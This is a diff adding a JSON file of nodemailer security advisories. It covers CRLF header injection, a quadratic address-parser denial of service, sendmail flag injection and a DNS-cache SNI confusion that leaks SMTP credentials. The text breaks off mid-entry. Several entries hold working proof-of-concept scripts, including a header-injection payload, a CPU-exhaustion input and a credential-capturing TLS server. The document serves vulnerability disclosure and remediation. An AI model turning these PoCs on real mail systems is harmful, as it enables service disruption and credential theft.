@@ -1,0 +1,1280 @@
+{
+  "vulns": [
+    {
+      "id": "GHSA-268h-hp4c-crq3",
+      "summary": "Nodemailer: CRLF injection in Nodemailer List-* header comments allows arbitrary message header injection",
+      "details": "### Summary\n\nNodemailer constructs `List-*` headers from the caller-provided `list` message option using internally prepared header values. The `list.*.comment` field is inserted into those prepared values without removing CR (`\\r`) or LF (`\\n`) characters. Because prepared headers bypass the normal header-value sanitizer and are passed to `mimeFuncs.foldLines()`, a CRLF sequence in a list comment is emitted as an actual header boundary in the generated RFC822 message.\n\nAn application that lets a lower-privileged or unauthenticated user influence `list.help.comment`, `list.unsubscribe.comment`, `list.subscribe.comment`, `list.post.comment`, `list.owner.comment`, `list.archive.comment`, or `list.id.comment` can therefore be made to generate messages containing attacker-chosen additional headers.\n\n### Details\nSource-to-sink evidence:\n\n- `lib/mailer/mail-message.js:241-249` calls `_getListHeaders(this.data.list)` and adds each returned value with `this.message.addHeader(listHeader.key, value)`.\n- `lib/mailer/mail-message.js:253-296` builds each list header value as `{ prepared: true, foldLines: true, value: ... }`.\n- For `List-ID`, `lib/mailer/mail-message.js:272-279` copies `value.comment` into the generated header value. If `mimeFuncs.isPlainText(comment)` returns true, it wraps the comment in quotes rather than encoding or CRLF-normalizing it.\n- For the other `List-*` headers, `lib/mailer/mail-message.js:283-288` copies `value.comment` into `(<comment>)`. If `mimeFuncs.isPlainText(comment)` returns true, the value is not encoded or CRLF-normalized.\n- `lib/mime-node/index.js:323-351` accepts the prepared header object.\n- `lib/mime-node/index.js:533-540` trusts `options.prepared`; when `foldLines` is set, it pushes `mimeFuncs.foldLines(key + ': ' + value)` directly into the header block.\n- The normal header-value sanitizer path is bypassed because the value is marked prepared. By contrast, ordinary unprepared header values are normalized in the regular header-building path.\n- `lib/mailer/mail-message.js:299-308` removes whitespace and angle brackets from `list.*.url`, so the confirmed injection source is the `comment` field, not the URL field.\n\nDefault/common exposure evidence:\n\n- `lib/nodemailer.js:21-60` exposes the public `createTransport(...).sendMail(...)` flow used by the package.\n- `examples/full.js:106-123` documents `list.unsubscribe.comment` and `list.id.comment` as normal message options.\n- The behavior is in shipped runtime code and does not require test-only code, non-default build steps, or undocumented internals.\n\nFalse-positive screening and negative controls:\n\n- SMTP command construction was separately reviewed. Envelope sender/recipients reject CRLF before SMTP commands, EHLO names strip CRLF, SIZE is numeric, and DSN fields are encoded; no SMTP command-injection variant was confirmed.\n- Ordinary `subject` header input containing CRLF was normalized to a single `Subject:` header and did not create `X-Injected` in the local control case.\n- Address display names and MIME filename/content-type parameters were reviewed by a focused MIME/header audit and were encoded or CRLF-normalized in local checks.\n- `prepared: true` custom headers are an explicit low-level escape hatch, but this issue is different because Nodemailer itself creates prepared headers from the documented `list.*.comment` option.\n\nVariant analysis:\n\nLocal testing confirmed the same root cause for comments in `List-Help`, `List-Unsubscribe`, `List-Subscribe`, `List-Post`, `List-Owner`, `List-Archive`, and `List-ID`. These should be fixed together by rejecting or normalizing CR/LF in list comments before prepared header generation, or by avoiding the prepared-header bypass for caller-controlled list values.\n\nAffected version evidence and uncertainty:\n\n- Confirmed vulnerable: `nodemailer` 8.0.8 at commit `15138a84c543c20aa399218534cdbbfa2ea1ce55`.\n- Git history shows `_getListHeaders` present in historical commits including `22fcff8` (`v4.3.0`) and related list-header work in `9b4f90a` (`v3.1.8`), but older versions were not dynamically tested during this audit.\n- Affected range is therefore recorded as unknown beyond the confirmed current version.\n- No patched version was identified in this checkout.\n\nSeverity rationale:\n\n- AV: The vulnerable library path is reached through application-level message submission in typical networked applications that use Nodemailer.\n- AC: A single CRLF sequence in a documented message option triggers the issue.\n- PR: Conservative assumption that the attacker is a lower-privileged user of an application that exposes list metadata fields. Some applications could expose this to unauthenticated users, but that was not assumed.\n- UI: No maintainer or victim interaction is needed after the application accepts the message object.\n- S: The impact remains in the application/mail-generation security scope.\n- C/I: Injected headers can affect message metadata, mail-client/filter interpretation, and downstream mail-pipeline decisions. No SMTP envelope recipient injection or code execution was demonstrated.\n- A: No availability impact was demonstrated.\n\nFinal self-review:\n\n- Reproduction evidence was generated locally from this checkout with a safe in-memory `streamTransport` PoC and a negative `Subject` control case.\n- The PoC is non-destructive and does not send network traffic outside the process.\n- The observed output contains an actual CRLF-delimited injected header line.\n- Reachability, sanitizer bypass, package exposure, variants, and non-exploitable sibling paths were checked as described above.\n- The affected range is not overclaimed; only the current tested version is confirmed vulnerable.\n\n### PoC\n\nFrom a clean checkout of `nodemailer` at commit `15138a84c543c20aa399218534cdbbfa2ea1ce55`, run:\n\n```bash\nnode <<'NODE'\n'use strict';\nconst nodemailer = require('./');\nconst headersEnd = raw => raw.slice(0, raw.indexOf('\\r\\n\\r\\n'));\nconst hasStandaloneInjected = raw => /\\r\\nX-Injected: yes\\)/.test(raw) || /\\r\\nX-Injected: yes\\r\\n/.test(raw);\n(async () => {\n  const transport = nodemailer.createTransport({ streamTransport: true, buffer: true });\n  const positive = await transport.sendMail({\n    from: 'sender@example.test',\n    to: 'recipient@example.test',\n    subject: 'control',\n    list: { unsubscribe: { url: 'https://example.test/u', comment: 'ok\\r\\nX-Injected: yes' } },\n    text: 'body'\n  });\n  const positiveRaw = positive.message.toString('utf8');\n  console.log('POSITIVE_HAS_INJECTED=' + hasStandaloneInjected(positiveRaw));\n  console.log('POSITIVE_LIST_LINE=' + JSON.stringify(headersEnd(positiveRaw).split('\\r\\n').filter(line => /^List-Unsubscribe:|^X-Injected:/.test(line)).join('\\n')));\n\n  const control = await transport.sendMail({\n    from: 'sender@example.test',\n    to: 'recipient@example.test',\n    subject: 'safe\\r\\nX-Injected: no',\n    text: 'body'\n  });\n  const controlRaw = control.message.toString('utf8');\n  console.log('CONTROL_HAS_INJECTED=' + /\\r\\nX-Injected: no\\r\\n/.test(controlRaw));\n  console.log('CONTROL_SUBJECT=' + JSON.stringify(headersEnd(controlRaw).split('\\r\\n').filter(line => /^Subject:|^X-Injected:/.test(line)).join('\\n')));\n\n  const variantKeys = ['help', 'unsubscribe', 'subscribe', 'post', 'owner', 'archive', 'id'];\n  const result = [];\n  for (const key of variantKeys) {\n    const info = await transport.sendMail({\n      from: 'sender@example.test',\n      to: 'recipient@example.test',\n      subject: 'variant ' + key,\n      list: Object.assign({}, { [key]: { url: key === 'id' ? 'example.test' : 'https://example.test/' + key, comment: 'c\\r\\nX-Variant-' + key + ': yes' } }),\n      text: 'body'\n    });\n    result.push(key + '=' + new RegExp('\\\\r\\\\nX-Variant-' + key + ': yes').test(info.message.toString('utf8')));\n  }\n  console.log('VARIANTS=' + result.join(','));\n})().catch(err => { console.error(err && err.stack || err); process.exit(1); });\nNODE\n```\n\nObserved output in this environment:\n\n```text\nPOSITIVE_HAS_INJECTED=true\nPOSITIVE_LIST_LINE=\"List-Unsubscribe: <https://example.test/u> (ok\\nX-Injected: yes)\"\nCONTROL_HAS_INJECTED=false\nCONTROL_SUBJECT=\"Subject: safe X-Injected: no\"\nVARIANTS=help=true,unsubscribe=true,subscribe=true,post=true,owner=true,archive=true,id=true\n```\n\nExpected vulnerable output: `POSITIVE_HAS_INJECTED=true` and all listed variants ending in `=true`. Expected negative/control output: `CONTROL_HAS_INJECTED=false`, showing the ordinary `Subject` header path does not create a separate injected header.\n\nCleanup: none required; the PoC uses only in-memory message generation.\n\n### Impact\n\nA lower-privileged attacker who can influence `list.*.comment` fields in an application using Nodemailer can inject arbitrary additional headers into generated email messages. This can alter message semantics and downstream mail-client or mail-filter behavior, including adding attacker-controlled metadata headers. The PoC confirms header-boundary injection in the generated RFC822 output; it does not demonstrate SMTP command injection, recipient injection, or code execution.\n\n### Suggested remediation\n\nNormalize or reject CR and LF in `list.*.comment` before constructing prepared `List-*` headers. Prefer sharing the same CRLF-neutralization behavior used for ordinary header values, or avoid using `prepared: true` for caller-controlled list comment content. Add regression tests for CRLF in every documented `list` comment-bearing field and verify that generated messages do not contain attacker-controlled standalone headers.",
+      "aliases": [
+        "CVE-2026-82661"
+      ],
+      "modified": "2026-09-10T03:51:07.307465115Z",
+      "published": "2026-06-15T17:36:06Z",
+      "database_specific": {
+        "github_reviewed_at": "2026-06-15T17:36:06Z",
+        "nvd_published_at": null,
+        "cwe_ids": [
+          "CWE-93"
+        ],
+        "severity": "MODERATE",
+        "github_reviewed": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-268h-hp4c-crq3"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "8.0.9"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.0.8",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-268h-hp4c-crq3/GHSA-268h-hp4c-crq3.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-2x7j-588g-ccc2",
+      "summary": "Nodemailer: Quadratic (O(n\u00b2)) time complexity in addressparser allows remote denial of service via a crafted address list",
+      "details": "### Summary\n\nNodemailer's address parser (`lib/addressparser/index.js`) parses a list of comma\u2011separated addresses in **quadratic time \u2014 O(n\u00b2)** in the number of addresses. A single crafted address string (e.g. a `To`, `Cc`, `Bcc`, `From`, or `Reply\u2011To` value, or any value passed to the exported `addressparser`) therefore consumes CPU proportional to the **square** of its length and blocks Node's single\u2011threaded event loop for the entire duration, denying service to every other request in the process.\n\nThis requires **no special application configuration and no cooperating receiver** \u2014 it is entirely inside the parser and triggers on the library's default code path. A ~1.5 MB address value freezes the process for ~25\u201330 seconds of 100% CPU; the cost grows with the square of the input, so a few\u2011MB value stalls the server for minutes. It is a distinct issue from the recursion DoS fixed as CVE\u20112025\u201114874 (that path is guarded by a nesting\u2011depth cap; this one is a flat, comma\u2011separated list with no such limit).\n\n### Details\n\n`addressparser` tokenizes the input, splits it into per\u2011address token groups, and then accumulates the parsed results in a loop (`lib/addressparser/index.js`, ~lines 500\u2013505):\n\n```js\naddresses.forEach(addr => {\n    const handled = _handleAddress(addr, depth);\n    if (handled.length) {\n        parsedAddresses = parsedAddresses.concat(handled);   // <-- line ~503\n    }\n});\n```\n\n`Array.prototype.concat` builds and returns a **new** array containing a copy of every element accumulated so far. Reassigning `parsedAddresses = parsedAddresses.concat(handled)` on each of the *n* iterations copies 1 + 2 + 3 + \u2026 + n elements in total, i.e. **O(n\u00b2)** work (and O(n\u00b2) transient allocations) for an input containing *n* addresses. Tokenization and `_handleAddress` themselves are linear; the quadratic blowup is entirely this accumulator.\n\n**Root\u2011cause proof.** Replacing only that line with an in\u2011place append and re\u2011running the exact same input:\n\n```\nparsedAddresses = parsedAddresses.concat(handled);      ->  100000 addresses:  ~6068 ms\nparsedAddresses.push.apply(parsedAddresses, handled);   ->  100000 addresses:  ~51 ms   (\u2248119x faster, now linear)\n```\n\n**Measured scaling** (nodemailer 9.0.6, `'a@b.com,'.repeat(n)`):\n\n| addresses n | input size | parse time | ratio for 2\u00d7 input |\n|---|---|---|---|\n| 25,000  | 0.19 MB | ~0.35 s | \u2013 |\n| 50,000  | 0.38 MB | ~1.4 s  | \u00d74.0 |\n| 100,000 | 0.76 MB | ~6\u20138 s  | \u00d73.9 |\n| 200,000 | 1.53 MB | ~25\u201330 s| \u00d74.1 |\n\nDoubling the input quadruples the time \u2014 the signature of O(n\u00b2).\n\n**Reachability.** The parser is invoked on any structured\u2011address header value on the normal send path (`MimeNode.setHeader('To'/'Cc'/'Bcc'/'From'/'Reply-To', value)` \u2192 `_parseAddresses` \u2192 `addressparser`, and `getEnvelope()`), so a single `transport.sendMail({ to: <crafted string> })` triggers it. It is also reached directly through the **exported** `require('nodemailer/lib/addressparser')`, which many applications call to validate or display user\u2011supplied recipient lists. Confirmed via the public API: `setHeader('To', 'a@b.com,'.repeat(80000))` + `getEnvelope()` blocks for ~3.9 s.\n\n**Suggested fix:** accumulate in place instead of rebuilding the array each iteration, e.g. `parsedAddresses.push.apply(parsedAddresses, handled);` (or `for (const h of handled) parsedAddresses.push(h);`). Optionally cap the number of addresses / input length before parsing.\n\n### PoC\n\nEnvironment: Node.js \u2265 18 and the published `nodemailer@9.0.6`. No transport, network, or configuration required \u2014 the cost is in parsing.\n\n`poc-dos.js`:\n```js\n'use strict';\nconst addressparser = require('nodemailer/lib/addressparser');\n\nconsole.log('addresses | input size | parse time');\nfor (const n of [25000, 50000, 100000, 200000]) {\n  const payload = 'a@b.com,'.repeat(n);        // n valid, comma-separated recipients\n  const t0 = process.hrtime.bigint();\n  addressparser(payload);                       // blocks synchronously\n  const ms = Number(process.hrtime.bigint() - t0) / 1e6;\n  console.log(String(n).padStart(9) + ' | ' + (payload.length / 1048576).toFixed(2) + ' MB   | ' + ms.toFixed(0).padStart(7) + ' ms');\n}\n```\n\nRun:\n```\nnpm init -y && npm install nodemailer@9.0.6\nnode poc-dos.js\n```\n\nActual output (nodemailer 9.0.6):\n```\naddresses | input size | parse time\n    25000 | 0.19 MB   |     381 ms\n    50000 | 0.38 MB   |    1435 ms\n   100000 | 0.76 MB   |    7949 ms\n   200000 | 1.53 MB   |   25154 ms\n```\n\nEquivalent trigger through the normal send API (freezes the event loop):\n```js\nconst nodemailer = require('nodemailer');\nnodemailer.createTransport({ jsonTransport: true })\n  .sendMail({ from: 'a@b.com', to: 'a@b.com,'.repeat(150000), subject: 'x', text: 'y' });\n// ~15+ seconds of 100% CPU inside addressparser before anything is sent\n```\n\n### Impact\n\n* **Who is impacted:** any service that runs Nodemailer (or the standalone `nodemailer/lib/addressparser`) on an address value that can be influenced by an untrusted party \u2014 a recipient field in a \"send email / invite / share\" feature, a `Reply\u2011To`/`From` derived from user input, a contact\u2011import or mailing\u2011list parser, or any endpoint that validates addresses with `addressparser`. No authentication, special option, or particular receiver is needed.\n\n## Patched in 9.1.0\n\nThree separate quadratic paths were fixed, not one:\n\n* `addressparser` rebuilt its accumulator with `concat()` on every address ([9116da9](https://github.com/nodemailer/nodemailer/commit/9116da9)).\n* The display-name merge loop directly below spliced each fragment out of the array, the same shape reached through `'a, b <c@d.com>,'.repeat(n)` (same commit).\n* `MimeNode#_convertAddresses` checked recipient uniqueness with a linear scan per address ([7cc38af](https://github.com/nodemailer/nodemailer/commit/7cc38af), refined in [34da642](https://github.com/nodemailer/nodemailer/commit/34da642)). This was the most severe of the three and the reported proof of concept did not reach it: `'a@b.com,'.repeat(n)` is one address repeated, which dedupes to a single envelope entry. A list of *distinct* recipients cost O(n^2) here, taking ~35s for 100k even after `addressparser` was fixed.\n\nFixed alongside: `[].concat.apply` in `_parseAddresses` threw `RangeError: Maximum call stack size exceeded` past roughly 124k recipients, with no crafted input needed ([83b8c48](https://github.com/nodemailer/nodemailer/commit/83b8c48)).\n\nParsing 200k addresses now takes ~80ms instead of ~25s, and every path scales linearly. A new `maxRecipients` option (default 100000) throws rather than truncating, as a backstop.",
+      "aliases": [
+        "CVE-2026-92596"
+      ],
+      "modified": "2026-09-17T11:56:03.050481347Z",
+      "published": "2026-09-08T21:33:17Z",
+      "database_specific": {
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-09-08T21:33:17Z",
+        "nvd_published_at": null,
+        "cwe_ids": [
+          "CWE-400",
+          "CWE-407"
+        ],
+        "severity": "HIGH"
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-2x7j-588g-ccc2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/pull/1848"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/34da64282dcdc9b0581c721a27ab2fa226673150"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/7cc38af418ffa6fc7e86085195ca5ca681694b3e"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/9116da9528c6524cefaed75185602a7e85d20434"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/releases/tag/v9.1.0"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "9.1.0"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-2x7j-588g-ccc2/GHSA-2x7j-588g-ccc2.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-48ww-j4fc-435p",
+      "summary": "Command injection in nodemailer",
+      "details": "This affects the package nodemailer before 6.4.16. Use of crafted recipient email addresses may result in arbitrary command flag injection in sendmail transport for sending mails.",
+      "aliases": [
+        "CVE-2020-7769"
+      ],
+      "modified": "2025-01-14T08:57:27.439344Z",
+      "published": "2021-05-10T19:16:52Z",
+      "database_specific": {
+        "nvd_published_at": "2020-11-12T09:15:00Z",
+        "cwe_ids": [
+          "CWE-88"
+        ],
+        "severity": "CRITICAL",
+        "github_reviewed": true,
+        "github_reviewed_at": "2021-04-19T22:42:19Z"
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7769"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/ba31c64c910d884579875c52d57ac45acc47aa54"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/blob/33b62e2ea6bc9215c99a9bb4bfba94e2fb27ebd0/lib/sendmail-transport/index.js#L75"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/blob/33b62e2ea6bc9215c99a9bb4bfba94e2fb27ebd0/lib/sendmail-transport/index.js%23L75"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1039742"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JS-NODEMAILER-1038834"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.npmjs.com/package/nodemailer"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "6.4.16"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/05/GHSA-48ww-j4fc-435p/GHSA-48ww-j4fc-435p.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-6vj9-mwq6-2f5v",
+      "summary": "Nodemailer: Process-global DNS cache reuses TLS `servername` across transports, enabling cross-tenant SMTP credential disclosure",
+      "details": "### Summary\n\nNodemailer's process-global DNS cache is keyed only by `host`, but each cache entry also stores the caller-specific TLS `servername`. When two direct SMTPS transports use the same DNS host with different `tls.servername` values, the first transport's server name is returned to the second transport and overwrites its explicitly configured value.\n\nAs a result, Nodemailer sends the wrong SNI value and verifies the peer certificate against the wrong identity. In a multi-tenant service or SNI-routed SMTP gateway, one tenant can prime the cache so that a victim transport connects to the attacker's TLS virtual host, accepts the attacker's certificate with `rejectUnauthorized: true`, and sends the victim's SMTP credentials to it.\n\n## Affected component\n\n- **Ecosystem:** npm\n- **Package:** `nodemailer`\n- **Repository:** https://github.com/nodemailer/nodemailer\n- **Tested version:** `10.0.1`\n- **Tested commit:** `40d52215aac65b811d7e131bc916f68605efd9d2`\n- **Runtime-confirmed vulnerable versions:** `5.0.0` and `10.0.1`\n- **Affected versions:** `>= 5.0.0, <= 10.0.1`\n- **Patched versions:** None known at the time of this report\n- **Affected mode:** Direct TLS/SMTPS connections (`secure: true`) where different transports use the same non-IP `host` and different TLS `servername` values\n\nThe vulnerable cache implementation was introduced in commit `6859b5dd96c8d9f0070a3169a877181b71df4a3b` on 2018-12-28. Git history shows `v5.0.0` as the first release tag containing that commit. The behavior remains present in `v10.0.1`.\n\n## Details\n\n### Root cause\n\n`src/shared/index.ts` defines one module-global DNS cache, keyed only by the DNS host:\n\n```ts\nexport const dnsCache = new Map<string, DnsCacheEntry>();\n```\n\nAlthough the cache key contains only `host`, the cached value contains both DNS addresses and the request-specific TLS identity:\n\n```ts\nconst value: DnsCacheValue = {\n    addresses: allAddresses,\n    servername: options.servername || host\n};\n\ndnsCache.set(host, {\n    value,\n    expires: Date.now() + (options.dnsTtl || DNS_TTL)\n});\n```\n\nOn a cache hit, `resolveHostname()` returns the cached `servername` without considering the current call's `options.servername`:\n\n```ts\nif (!cached.expires || cached.expires >= now) {\n    return callback(\n        null,\n        formatDNSValue(cached.value, {\n            cached: true\n        })\n    );\n}\n```\n\n`formatDNSValue()` copies that stale value into the result:\n\n```ts\nreturn Object.assign(\n    {\n        servername: value.servername,\n        host,\n        _addresses: addresses\n    },\n    extra || {}\n);\n```\n\nFor a direct TLS connection, `SMTPConnection.connect()` initially copies the current transport's TLS configuration into `opts`. `_resolveAndConnect()` then overwrites every truthy field with the cached resolver result, including `opts.servername`:\n\n```ts\nObject.assign(opts, this.options.tls || {});\n\nif (this.servername && !opts.servername) {\n    opts.servername = this.servername;\n}\n\nreturn this._resolveAndConnect(opts, resolved => {\n    this._connectToHost(opts, this.secureConnection);\n});\n```\n\n```ts\nfor (const key of Object.keys(resolved!)) {\n    if (key.charAt(0) !== '_' && (resolved as { [key: string]: any })[key]) {\n        (opts as { [key: string]: any })[key] = (resolved as { [key: string]: any })[key];\n    }\n}\n```\n\nThe resulting `opts` object is passed to `tls.connect()`. Node therefore sends the cached server name as SNI and verifies the certificate against that cached name, rather than against the server name explicitly configured for the current transport.\n\nThe default DNS cache TTL is five minutes:\n\n```ts\nconst DNS_TTL = 5 * 60 * 1000;\n```\n\n### Code path\n\n```text\nTenant A: createTransport({ host: H, secure: true,\n                            tls: { servername: attackerName } })\n  -> SMTPConnection.connect()\n  -> _resolveAndConnect(opts)\n  -> shared.resolveHostname({ host: H, servername: attackerName })\n  -> dnsCache.set(H, { addresses, servername: attackerName })\n\nVictim: createTransport({ host: H, secure: true,\n                          tls: { servername: victimName } })\n  -> SMTPConnection.connect()\n  -> opts.servername = victimName\n  -> _resolveAndConnect(opts)\n  -> shared.resolveHostname({ host: H, servername: victimName })\n  -> dnsCache.get(H)\n  -> returns cached servername = attackerName\n  -> _resolveAndConnect overwrites opts.servername\n  -> tls.connect({ servername: attackerName })\n  -> attacker SNI virtual host and certificate are selected\n  -> AUTH transmits victim SMTP credentials\n```\n\n### Relevant source locations in the tested revision\n\n- `src/shared/index.ts:184` \u2014 five-minute default cache TTL\n- `src/shared/index.ts:245` \u2014 process-global cache keyed by host\n- `src/shared/index.ts:247-262` \u2014 cached `servername` returned by `formatDNSValue()`\n- `src/shared/index.ts:292-323` \u2014 host-only lookup and cache-hit return\n- `src/shared/index.ts:350-359` \u2014 caller-specific `servername` stored in host-only cache\n- `src/smtp-connection/index.ts:713-729` \u2014 direct TLS options and resolver call\n- `src/smtp-connection/index.ts:741-763` \u2014 cached fields overwrite current connection options\n\n## PoC\n\n### Prerequisites\n\n- Node.js 20 (tested with Node.js `20.20.2`)\n- A checkout/build of Nodemailer `10.0.1`\n- OpenSSL to generate the local test certificate\n\nNo external SMTP server or network access is required.\n\n### 1. Generate a certificate for only `attacker.test`\n\nCreate `openssl.cnf`:\n\n```ini\n[req]\ndistinguished_name = dn\nx509_extensions = ext\nprompt = no\n\n[dn]\nCN = attacker.test\n\n[ext]\nsubjectAltName = DNS:attacker.test\nbasicConstraints = critical,CA:TRUE\nkeyUsage = critical,digitalSignature,keyEncipherment,keyCertSign\nextendedKeyUsage = serverAuth\n```\n\nGenerate the certificate and private key:\n\n```bash\nopenssl req -x509 -newkey rsa:2048 -nodes -days 1 \\\n  -keyout attacker-key.pem -out attacker-cert.pem -config openssl.cnf\n```\n\n### 2. Save the following as `poc-dns-cache-servername-confusion.mjs`\n\nAdjust the two import paths if the PoC is not saved beside the repository checkout.\n\n```js\nimport fs from 'node:fs';\nimport tls from 'node:tls';\nimport nodemailer from '../../nodemailer/dist/esm/nodemailer.js';\nimport * as shared from '../../nodemailer/dist/esm/shared/index.js';\n\nconst cert = fs.readFileSync(new URL('./tls-fixture/attacker-cert.pem', import.meta.url));\nconst key = fs.readFileSync(new URL('./tls-fixture/attacker-key.pem', import.meta.url));\nconst observedSni = [];\nconst observedAuth = [];\n\nconst server = tls.createServer({ key, cert }, socket => {\n    observedSni.push(socket.servername);\n    socket.write('220 attacker.test ESMTP\\r\\n');\n    let input = '';\n    socket.on('data', chunk => {\n        input += chunk.toString();\n        let end;\n        while ((end = input.indexOf('\\r\\n')) >= 0) {\n            const line = input.slice(0, end);\n            input = input.slice(end + 2);\n            if (/^EHLO /i.test(line)) {\n                socket.write('250-attacker.test\\r\\n250 AUTH PLAIN\\r\\n');\n            } else if (/^AUTH /i.test(line)) {\n                observedAuth.push(line);\n                socket.write('235 2.7.0 Authentication successful\\r\\n');\n            } else if (/^QUIT/i.test(line)) {\n                socket.end('221 Bye\\r\\n');\n            } else {\n                socket.write('250 OK\\r\\n');\n            }\n        }\n    });\n});\n\nawait new Promise(resolve => server.listen(0, '127.0.0.1', resolve));\n\ntry {\n    shared.dnsCache.clear();\n\n    // Tenant A seeds the process-global cache for the shared DNS host.\n    const attackerTransport = nodemailer.createTransport({\n        host: 'localhost',\n        port: server.address().port,\n        secure: true,\n        auth: { user: 'attacker@example.test', pass: 'attacker-secret' },\n        tls: {\n            ca: cert,\n            servername: 'attacker.test',\n            rejectUnauthorized: true\n        }\n    });\n    await attackerTransport.verify();\n    attackerTransport.close();\n\n    // The victim explicitly configures a different TLS identity.\n    const victimTransport = nodemailer.createTransport({\n        host: 'localhost',\n        port: server.address().port,\n        secure: true,\n        auth: { user: 'victim@example.test', pass: 'victim-secret' },\n        tls: {\n            ca: cert,\n            servername: 'victim.test',\n            rejectUnauthorized: true\n        }\n    });\n    await victimTransport.verify();\n    victimTransport.close();\n\n    const decoded = observedAuth.map(line =>\n        line.startsWith('AUTH PLAIN ')\n            ? Buffer.from(line.slice('AUTH PLAIN '.length), 'base64').toString()\n            : null\n    );\n\n    console.log(JSON.stringify({\n        attackerConfiguredServername: 'attacker.test',\n        victimConfiguredServername: 'victim.test',\n        serverObservedSniForBothConnections: observedSni,\n        serverReceivedCredentials: decoded\n    }, null, 2));\n} finally {\n    shared.dnsCache.clear();\n    await new Promise(resolve => server.close(resolve));\n}\n```\n\n### 3. Build and run\n\nFrom the Nodemailer checkout:\n\n```bash\nnpm install\nnpm run build\nnode ../audit/nodemailer/poc-dns-cache-servername-confusion.mjs\n```\n\n### Observed result\n\n```json\n{\n  \"attackerConfiguredServername\": \"attacker.test\",\n  \"victimConfiguredServername\": \"victim.test\",\n  \"serverObservedSniForBothConnections\": [\n    \"attacker.test\",\n    \"attacker.test\"\n  ],\n  \"serverReceivedCredentials\": [\n    \"\\\\u0000attacker@example.test\\\\u0000attacker-secret\",\n    \"\\\\u0000victim@example.test\\\\u0000victim-secret\"\n  ]\n}\n```\n\nThe victim configured `victim.test`, but the server observes `attacker.test` for both handshakes. The local certificate contains only `attacker.test`, yet the victim connection succeeds with `rejectUnauthorized: true` and then sends the victim's username and password.\n\n### Expected result\n\nThe second connection must use `victim.test` for SNI and certificate hostname verification. With the PoC certificate, it should fail with a hostname mismatch before SMTP authentication occurs. It must never transmit victim credentials after validating the peer as `attacker.test`.\n\n## Impact\n\nThe vulnerability affects long-running applications that create multiple Nodemailer transports in one process and let separate tenants or security domains configure transports that share a DNS `host`. A practical example is an email platform whose SMTP gateway uses SNI to route several customer-specific SMTP endpoints behind one hostname.\n\nAn attacker who can create or exercise one transport can prime the global cache with the shared host and the attacker's `tls.servername`. During the cache lifetime, a victim's direct SMTPS connection to that host can:\n\n1. send the attacker's server name as SNI;\n2. be routed to the attacker's TLS virtual host;\n3. validate the attacker's certificate against the stale name, even though strict certificate validation is enabled; and\n4. transmit the victim's SMTP username and password to that endpoint.\n\nPossession of SMTP credentials may also let the attacker read or change mail account state where the provider reuses those credentials, or send mail as the victim. The exact secondary impact depends on the SMTP provider.\n\nWhere the attacker cannot control an SNI virtual host, stale cross-transport SNI can still cause certificate mismatch failures and cross-tenant availability impact.\n\n### Preconditions and limitations\n\n- Two transports must execute in the same Node.js process within the cache lifetime.\n- They must use the same non-IP `host` cache key and different `tls.servername` values.\n- Credential interception requires an endpoint or gateway that routes connections using SNI, or another deployment where the attacker controls the endpoint selected by the stale name.\n- The 